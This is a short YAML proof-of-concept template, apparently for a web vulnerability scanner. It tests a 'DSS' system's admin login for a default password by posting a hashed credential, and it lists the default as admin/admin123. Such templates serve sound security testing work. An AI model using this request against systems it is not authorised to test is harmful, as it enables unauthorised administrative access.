name: poc-yaml-dss-default-password

transport: http
rules:
  dss:
    request:
      method: POST
      headers:
        Content-Type: application/x-www-form-urlencoded
      path: /admin/login_login.action
      body: userBean.loginName=admin&userBean.loginPass=dc0134141ec9319b6b4a00a75fc6a6f5
    expression: |
      response.status == 200 && response.body.bcontains(b"DSS") && response.headers["Set-Cookie"].contains("JSESSIONID=") && response.body.bcontains(b"ocx.LoginOutServer")
      
expression: dss()

detail:
    author: iak3ec(https://github.com/nu0l)
    links: 
    default: admin/admin123